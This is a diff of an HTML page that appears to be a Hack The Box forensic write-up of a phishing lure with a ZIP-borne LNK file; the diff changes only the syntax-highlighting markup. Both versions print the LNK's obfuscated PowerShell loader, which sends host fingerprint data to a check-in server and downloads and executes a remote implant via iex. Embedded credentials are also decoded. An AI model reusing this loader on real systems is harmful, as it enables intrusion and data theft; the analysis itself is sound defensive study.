@@ -949,10 +949,10 @@ a distraction, collected system fingerprint data, checked in to
 <p>At <code>Fri, 14 Nov 2025 20:33:15</code> a phishing email was sent from
 <code>eu-health@ca1e-corp.org</code> — spoofing a legitimate-looking EU Health
 Logistics Office address to target <code>kamil.poltavez@cale-corp.org</code>:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">From: EU Health Logistics Office &lt;eu-health@ca1e-corp.org&gt;
-</span></span><span class="line"><span class="ln">2</span><span class="cl">To:   kamil.poltavez@cale-corp.org</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>From: EU Health Logistics Office &lt;eu-health@ca1e-corp.org&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>To:   kamil.poltavez@cale-corp.org</span></span></code></pre></div></div>
 <p>The email contained an attached ZIP file:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">Health_Clearance-December_Archive.zip</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>Health_Clearance-December_Archive.zip</span></span></code></pre></div></div>
 <p><figure><img
     class="my-0 rounded-md"
     loading="lazy"
@@ -983,8 +983,8 @@ revealed the archive password: <code>Up7Pk99G</code>.</p>
     data-zoom-src="/investigations/htb-a-call-from-the-museum/image.png"></figure>
 </p>
 <p>Unpacking the archive with the password yielded two files:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">EU_Health_Compliance_Portal.lnk
-</span></span><span class="line"><span class="ln">2</span><span class="cl">Health_Clearance_Guidelines.pdf</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>EU_Health_Compliance_Portal.lnk
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>Health_Clearance_Guidelines.pdf</span></span></code></pre></div></div>
 
 <h3 class="relative group"><span style="color:red">Static Analysis</span>
     <div id="static-analysis" class="anchor"></div>
@@ -1028,17 +1028,17 @@ victim while the payload executed in the background.</p>
 in response. Using the returned session ID, it fetched the next-stage implant from
 <code>https://advent-of-the-relics-forum.htb.blue/api/v1/implant/cid=&lt;id&gt;</code>
 and piped the response directly into <code>Invoke-Expression</code> for execution.</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">WindowsPowerShell</span><span class="p">\</span><span class="n">v1</span><span class="p">.</span><span class="mf">0</span><span class="p">\</span><span class="n">powershell</span><span class="p">.</span><span class="py">exe</span> <span class="n">-nONi</span> <span class="n">-nOp</span> <span class="n">-eXeC</span> <span class="n">bYPaSs</span> <span class="n">-cOmManD</span> <span class="s2">&#34;
-</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="nv">$Bs</span><span class="s2"> = (-join(&#39;Basic c3&#39;,&#39;ZjX3Rlb&#39;,&#39;XA6U2&#39;,&#39;5&#39;,&#39;vd0JsY&#39;,&#39;WNrT&#39;,&#39;3V&#39;,&#39;0X&#39;,&#39;zIwM&#39;,&#39;jYh&#39;));sap`s .\Health_Clearance_Guidelines.pdf;
-</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="nv">$AX</span><span class="s2">=</span><span class="nv">$env:USERNAME</span><span class="s2">;</span><span class="nv">$oM</span><span class="s2">=[System.Uri]::UnescapeDataString(&#39;https%3A%2F%2Fhealth%2Dstatus%2Drs%2Ecom%2Fapi%2Fv1%2Fcheckin&#39;);
-</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="nv">$Bz</span><span class="s2">=</span><span class="nv">$env:USERDOMAIN</span><span class="s2">;</span><span class="nv">$Lj</span><span class="s2">=[System.Uri]::UnescapeDataString(&#39;https%3A%2F%2Fadvent%2Dof%2Dthe%2Drelics%2Dforum%2Ehtb%2Eblue%2Fapi%2Fv1%2Fimplant%2Fcid%3D&#39;);
-</span></span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="nv">$Mw</span><span class="s2">=(gp HKLM:\SOFTWARE\Microsoft\Cryptography).MachineGuid;
-</span></span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nv">$pP</span><span class="s2"> = @{u=</span><span class="nv">$AX</span><span class="s2">;d=</span><span class="nv">$Bz</span><span class="s2">;g=</span><span class="nv">$Mw</span><span class="s2">};
-</span></span></span><span class="line"><span class="ln">7</span><span class="cl"><span class="nv">$Zu</span><span class="s2">=(i`wr </span><span class="nv">$oM</span><span class="s2"> -Method POST -Body </span><span class="nv">$pP</span><span class="s2">).Content;</span><span class="nv">$Hd</span><span class="s2"> = @{Authorization = </span><span class="nv">$Bs</span><span class="s2"> };i`wr -Headers </span><span class="nv">$Hd</span><span class="s2"> </span><span class="nv">$Lj$Zu</span><span class="s2"> | i`ex;&#34;</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>C:\Windows\System32\WindowsPowerShell\v1.<span style="color:#ae81ff">0</span>\powershell.exe -nONi -nOp -eXeC bYPaSs -cOmManD <span style="color:#e6db74">&#34;
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>$Bs<span style="color:#e6db74"> = (-join(&#39;Basic c3&#39;,&#39;ZjX3Rlb&#39;,&#39;XA6U2&#39;,&#39;5&#39;,&#39;vd0JsY&#39;,&#39;WNrT&#39;,&#39;3V&#39;,&#39;0X&#39;,&#39;zIwM&#39;,&#39;jYh&#39;));sap`s .\Health_Clearance_Guidelines.pdf;
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>$AX<span style="color:#e6db74">=</span>$env:USERNAME<span style="color:#e6db74">;</span>$oM<span style="color:#e6db74">=[System.Uri]::UnescapeDataString(&#39;https%3A%2F%2Fhealth%2Dstatus%2Drs%2Ecom%2Fapi%2Fv1%2Fcheckin&#39;);
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>$Bz<span style="color:#e6db74">=</span>$env:USERDOMAIN<span style="color:#e6db74">;</span>$Lj<span style="color:#e6db74">=[System.Uri]::UnescapeDataString(&#39;https%3A%2F%2Fadvent%2Dof%2Dthe%2Drelics%2Dforum%2Ehtb%2Eblue%2Fapi%2Fv1%2Fimplant%2Fcid%3D&#39;);
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>$Mw<span style="color:#e6db74">=(gp HKLM:\SOFTWARE\Microsoft\Cryptography).MachineGuid;
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>$pP<span style="color:#e6db74"> = @{u=</span>$AX<span style="color:#e6db74">;d=</span>$Bz<span style="color:#e6db74">;g=</span>$Mw<span style="color:#e6db74">};
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span><span>$Zu<span style="color:#e6db74">=(i`wr </span>$oM<span style="color:#e6db74"> -Method POST -Body </span>$pP<span style="color:#e6db74">).Content;</span>$Hd<span style="color:#e6db74"> = @{Authorization = </span>$Bs<span style="color:#e6db74"> };i`wr -Headers </span>$Hd<span style="color:#e6db74"> </span>$Lj$Zu<span style="color:#e6db74"> | i`ex;&#34;</span></span></span></code></pre></div></div>
 <p>The authorization header was assembled from split string fragments
 to evade static detection. Decoded, it contained hardcoded credentials:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">Basic c3ZjX3RlbXA6U25vd0JsYWNrT3V0XzIwMjYh
-</span></span><span class="line"><span class="ln">2</span><span class="cl">       -&gt; svc_temp:SnowBlackOut_2026!</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>Basic c3ZjX3RlbXA6U25vd0JsYWNrT3V0XzIwMjYh
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>       -&gt; svc_temp:SnowBlackOut_2026!</span></span></code></pre></div></div>
 
 <h4 class="relative group"><span style="color:red">PDF</span>
     <div id="pdf" class="anchor"></div>
@@ -1051,19 +1051,19 @@ to evade static detection. Decoded, it contained hardcoded credentials:</p>
 </h4>
 <p>The PDF was confirmed legitimate with no malicious content — no JavaScript,
 no embedded files, no launch actions, no OpenAction triggers:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln"> 1</span><span class="cl">PDFiD 0.2.8 Health_Clearance_Guidelines.pdf
-</span></span><span class="line"><span class="ln"> 2</span><span class="cl"> PDF Header: %PDF-1.4
-</span></span><span class="line"><span class="ln"> 3</span><span class="cl"> obj                  314
-</span></span><span class="line"><span class="ln"> 4</span><span class="cl"> endobj               314
-</span></span><span class="line"><span class="ln"> 5</span><span class="cl"> stream                14
-</span></span><span class="line"><span class="ln"> 6</span><span class="cl"> endstream             14
-</span></span><span class="line"><span class="ln"> 7</span><span class="cl"> /Page                  3
-</span></span><span class="line"><span class="ln"> 8</span><span class="cl"> /Encrypt               0
-</span></span><span class="line"><span class="ln"> 9</span><span class="cl"> /JS                    0
-</span></span><span class="line"><span class="ln">10</span><span class="cl"> /JavaScript            0
-</span></span><span class="line"><span class="ln">11</span><span class="cl"> /OpenAction            0
-</span></span><span class="line"><span class="ln">12</span><span class="cl"> /Launch                0
-</span></span><span class="line"><span class="ln">13</span><span class="cl"> /EmbeddedFile          0</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span>PDFiD 0.2.8 Health_Clearance_Guidelines.pdf
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span> PDF Header: %PDF-1.4
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span> obj                  314
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span> endobj               314
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span> stream                14
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span> endstream             14
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span> /Page                  3
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span> /Encrypt               0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span> /JS                    0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span> /JavaScript            0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span> /OpenAction            0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span> /Launch                0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span> /EmbeddedFile          0</span></span></code></pre></div></div>
 <p><figure><img
     class="my-0 rounded-md"
     loading="lazy"
